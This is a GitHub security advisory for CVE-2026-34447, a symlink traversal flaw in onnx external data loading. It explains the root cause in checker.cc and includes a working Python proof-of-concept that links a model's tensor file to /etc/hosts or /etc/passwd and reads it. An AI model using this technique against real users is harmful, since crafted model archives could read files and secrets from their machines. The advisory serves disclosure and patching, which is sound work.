# [M] ONNX: External Data Symlink Traversal

## Summary
Severity: Medium
Advisory: GHSA-p433-9wv8-28xj
CVE: CVE-2026-34447
CWE: CWE-22, CWE-61
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-p433-9wv8-28xj
Type: github-advisory

## Affected
- PyPI: `onnx` — affected >=0 <1.21.0

## Details
Summary
- Issue: Symlink traversal in external data loading allows reading files outside the model directory.
- Affected code: `onnx/onnx/checker.cc: resolve_external_data_location` used via Python `onnx.external_data_helper.load_external_data_for_model`.
- Impact: Arbitrary file read (confidentiality breach) when a model’s external data path resolves to a symlink targeting a file outside the model directory.

Root Cause
- The function `resolve_external_data_location(base_dir, location, tensor_name)` intends to ensure that external data files reside within `base_dir`. It:
  - Rejects empty/absolute paths
  - Normalizes the relative path and rejects `..`
  - Builds `data_path = base_dir / relative_path`
  - Checks `exists(data_path)` and `is_regular_file(data_path)`
- However, `std::filesystem::is_regular_file(path)` follows symlinks to their targets. A symlink placed inside `base_dir` that points to a file outside `base_dir` will pass the checks and be returned. The Python loader then opens the path and reads the target file.

Code Reference
- File: onnx/onnx/checker.cc:970-1060
- Key logic:
  - Normalization: `auto relative_path = file_path.lexically_normal().make_preferred();`
  - Existence: `std::filesystem::exists(data_path)`
  - Regular file check: `std::filesystem::is_regular_file(data_path)`
  - Returned path is later opened in Python: `external_data_helper.load_external_data_for_tensor`.

Proof of Concept (PoC)
- File: `onnx_external_data_symlink_traversal_poc.py`
- Behavior: Creates a model with an external tensor pointing to `tensor.bin`. In the model directory, creates `tensor.bin` as a symlink to `/etc/hosts` (or similar). Calls `load_external_data_for_model(model, base_dir)`. Confirms that `tensor.raw_data` contains content from the target outside the model directory.
- Run:
  - `python3 onnx_external_data_symlink_traversal_poc.py`
  - Expected: `[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir`

onnx_external_data_symlink_traversal_poc.py

```python
#!/usr/bin/env python3
"""
ONNX External Data Symlink Traversal PoC

Finding: load_external_data_for_model() (via c_checker._resolve_external_data_location)
does not reject symlinks. A relative location that is a symlink inside the
model directory can target a file outside the directory and will be read.

Impact: Arbitrary file read outside model_dir when external data files are
obtained from attacker-controlled archives (zip/tar) that create symlinks.

This PoC:
 - Creates a model with a tensor using external_data location 'tensor.bin'
 - Creates 'tensor.bin' as a symlink to a system file (e.g., /etc/hosts)
 - Calls load_external_data_for_model(model, base_dir)
 - Confirms that tensor.raw_data contains the content of the outside file

Safe: only reads a benign system file if present.
"""

import os
import sys
import tempfile
import pathlib

# Ensure we import installed onnx, not the local cloned package
_here = os.path.dirname(os.path.abspath(__file__))
if _here in sys.path:
    sys.path.remove(_here)

import onnx
from onnx import helper, TensorProto
from onnx.external_data_helper import (
    set_external_data,
    load_external_data_for_model,
)


def pick_target_file():
    candidates = ["/etc/hosts", "/etc/passwd", "/System/Library/CoreServices/SystemVersion.plist"]
    for p in candidates:
        if os.path.exists(p) and os.path.isfile(p):
            return p
    raise RuntimeError("No suitable readable system file found for this PoC")


def build_model_with_external(location: str):
    # A 1D tensor; data will be filled from external file
    tensor = helper.make_tensor(
        name="X_ext",
        data_type=TensorProto.UINT8,
        dims=[0],  # dims will be inferred after raw_data is read
        vals=[],
    )
    # add dummy raw_data then set_external_data to mark as external
    tensor.raw_data = b"dummy"
    set_external_data(tensor, location=location)

    # Minimal graph that just feeds the initializer as Constant
    const_node = helper.make_node("Constant", inputs=[], outputs=["out"], value=tensor)
    graph = helper.make_graph([const_node], "g", inputs=[], outputs=[helper.make_tensor_value_info("out", TensorProto.UINT8, None)])
    model = helper.make_model(graph)
    return model


def main():
    base = tempfile.mkdtemp(prefix="onnx_symlink_poc_")
    model_dir = base
    link_name = os.path.join(model_dir, "tensor.bin")

    target = pick_target_file()
    print(f"[*] Using target file: {target}")

    # Create symlink in model_dir pointing outside
    try:
        pathlib.Path(link_name).symlink_to(target)
    except OSError as e:
        print(f"[!] Failed to create symlink: {e}")
        print("    This PoC needs symlink capability.")
        return 1

    # Build model referencing the relative location 'tensor.bin'
    model = build_model_with_external(location="tensor.bin")

    # Use in-memory model; explicitly load external data from base_dir
    loaded = model
    print("[*] Loading external data into in-memory model...")
    try:
        load_external_data_for_model(loaded, base_dir=model_dir)
    except Exception as e:
        print(f"[!] load_external_data_for_model raised: {e}")
        return 1

    # Validate that raw_data came from outside file by checking a prefix
    raw = None
    # Search initializers
    for t in loaded.graph.initializer:
        if t.name == "X_ext" and t.HasField("raw_data"):
            raw = t.raw_data
            break
    # Search constant attributes if not found
    if raw is None:
        for node in loaded.graph.node:
            for attr in node.attribute:
                if attr.HasField("t") and attr.t.name == "X_ext" and attr.t.HasField("raw_data"):
                    raw = attr.t.raw_data
                    break
            if raw is not None:
                break
    if raw is None:
        print("[?] Did not find raw_data on tensor; PoC inconclusive")
        return 2

    with open(target, "rb") as f:
        target_prefix = f.read(32)
    if raw.startswith(target_prefix):
        print("[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir")
        print(f"      Symlink {link_name} -> {target}")
        return 0
    else:
        print("[?] Raw data did not match target prefix; environment-specific behavior")
        return 3


if __name__ == "__main__":
    sys.exit(main())

```

## References
- https://github.com/onnx/onnx/security/advisories/GHSA-p433-9wv8-28xj
- https://nvd.nist.gov/vuln/detail/CVE-2026-34447
- https://github.com/onnx/onnx
- https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2026-104.yaml
